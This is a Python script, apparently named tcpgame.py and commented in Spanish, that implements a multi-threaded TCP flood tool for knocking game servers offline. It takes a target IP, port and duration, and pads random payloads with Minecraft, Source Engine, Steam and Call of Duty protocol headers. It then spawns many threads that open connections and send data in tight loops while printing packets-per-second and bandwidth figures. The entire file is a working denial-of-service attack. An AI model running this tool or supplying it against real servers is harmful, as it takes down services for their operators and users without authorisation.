import socket
import random
import sys
import time
import threading
import os
import struct
import select

class TCPGameFlood:
    def __init__(self, target_ip, target_port, duration):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.running = True
        self.total_packets = 0
        self.total_bytes = 0
        self.lock = threading.Lock()
        
        # Game payloads OPTIMIZADOS
        self.game_payloads = self.generate_game_payloads()
        
    def generate_game_payloads(self):
        """Generar payloads de juegos optimizados para velocidad"""
        payloads = []
        
        # Minecraft (rápidos)
        minecraft_base = [
            b'\x00\x00\x00\x0f\x00\x00\x00\x00',
            b'\x00\x00\x00\x01\x00\x00\x00\x00',
            b'\x00\x00\x00\x02\x00\x00\x00\x00',
            b'\x00\x00\x00\x03\x00\x00\x00\x00',
        ]
        
        # Source Engine
        source_base = [
            b'\xFF\xFF\xFF\xFF\x54\x53\x6F\x75\x72\x63\x65',
            b'\xFF\xFF\xFF\xFF\x55\x00\x00\x00',
            b'\xFF\xFF\xFF\xFF\x56\x00\x00\x00',
        ]
        
        # Steam
        steam_base = [
            b'\x00\x00\x00\x00\x00\x00\x00\x00',
            b'\x01\x00\x00\x00\x00\x00\x00\x00',
        ]
        
        # Call of Duty
        cod_base = [
            b'\xFF\xFF\xFF\xFF\x67\x65\x74\x69\x6E\x66\x6F',
            b'\xFF\xFF\xFF\xFF\x67\x65\x74\x73\x74\x61\x74',
        ]
        
        # Expandir cada payload a 1400 bytes (MTU optimizado)
        for base_list in [minecraft_base, source_base, steam_base, cod_base]:
            for base in base_list:
                # Versión normal
                payloads.append(base + random._urandom(1400 - len(base)))
                # Versión repetida (más rápida de generar)
                pattern = base * 100
                payloads.append(pattern[:1400])
        
        # Payloads pre-generados para máxima velocidad
        for _ in range(100):
            payloads.append(random._urandom(1400))
            payloads.append(b'\x00' * 1400)
            payloads.append(b'\xFF' * 1400)
            payloads.append(os.urandom(1400))
        
        return payloads
    
    def get_cpu_count(self):
        try:
            cpus = os.cpu_count() or 4
            return cpus * 4  # Más threads que en C
        except:
            return 16
    
    def tcp_worker_c(self, worker_id):
        """Worker TCP estilo C - máxima potencia"""
        end_time = time.time() + self.duration
        seed = int(time.time()) ^ worker_id ^ (worker_id << 16)
        
        # Pre-generar payloads para este worker (como en C)
        local_payloads = []
        for i in range(10):
            random.seed(seed + i)
            local_payloads.append(random._urandom(1400))
        
        dst = (self.target_ip, self.target_port)
        packet_count = 0
        byte_count = 0
        
        while time.time() < end_time and self.running:
            for attempt in range(200):  # Más intentos que en C
                if time.time() >= end_time:
                    break
                
                try:
                    # Socket rápido
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
                    sock.settimeout(0.001)  # Timeout ultra rápido
                    
                    # Non-blocking connect
                    sock.setblocking(False)
                    try:
                        sock.connect(dst)
                    except BlockingIOError:
                        pass
                    
                    # Select rápido
                    _, ready, _ = select.select([], [sock], [], 0.001)
                    
                    if ready:
                        # ENVÍO MASIVO - como en C
                        payload = local_payloads[packet_count % 10]
                        
                        # Bucle de envío mientras se pueda
                        while time.time() < end_time:
                            try:
                                sent = sock.send(payload)
                                packet_count += 1
                                byte_count += sent
                            except:
                                break
                    
                    sock.close()
                    
                except Exception as e:
                    continue
            
            # Stats cada cierto tiempo
            if packet_count % 10000 == 0:
                with self.lock:
                    self.total_packets += packet_count
                    self.total_bytes += byte_count
                packet_count = 0
                byte_count = 0
    
    def start_attack(self):
        num_threads = self.get_cpu_count()
        
        print(f"[🔥] TCP GAME FLOOD - MODO C OPTIMIZADO")
        print(f"[🎯] Target: {self.target_ip}:{self.target_port}")
        print(f"[⏱️] Duration: {self.duration}s")
        print(f"[🧵] Threads: {num_threads}")
        print(f"[🎮] Game payloads: {len(self.game_payloads)}")
        print(f"[⚡] Modo: Máxima potencia (estilo C)")
        
        # Iniciar workers
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=self.tcp_worker_c, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Monitor de estadísticas (como en C)
        start_time = time.time()
        last_packets = 0
        last_bytes = 0
        
        while time.time() - start_time < self.duration:
            time.sleep(1)
            current_time = time.time()
            elapsed = int(current_time - start_time)
            
            with self.lock:
                current_packets = self.total_packets
                current_bytes = self.total_bytes
                pps = current_packets - last_packets
                bps = current_bytes - last_bytes
                last_packets = current_packets
                last_bytes = current_bytes
            
            mbps = (bps * 8) / (1024 * 1024)
            
            print(f"\r[📊] {elapsed}s | Paq: {current_packets:,} | {pps:,} pps | {mbps:.1f} Mbps", end="")
        
        self.running = False
        time.sleep(1)
        
        with self.lock:
            final_packets = self.total_packets
            final_bytes = self.total_bytes
        
        mb_total = final_bytes / (1024 * 1024)
        avg_mbps = (final_bytes * 8) / (1024 * 1024 * self.duration)
        
        print(f"\n\n[✅] TCP GAME FLOOD COMPLETADO")
        print(f"[📊] Total paquetes: {final_packets:,}")
        print(f"[📊] Total datos: {mb_total:.1f} MB")
        print(f"[📊] Velocidad media: {avg_mbps:.1f} Mbps")
        print(f"[📊] Paquetes/segundo: {final_packets/self.duration:,.0f}")

def main():
    if len(sys.argv) != 4:
        print("Uso: python3 tcpgame.py <ip> <port> <time>")
        print("Ejemplo: python3 tcpgame.py 192.168.1.1 25565 60")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    
    flood = TCPGameFlood(target_ip, target_port, duration)
    flood.start_attack()

if __name__ == "__main__":
    main()
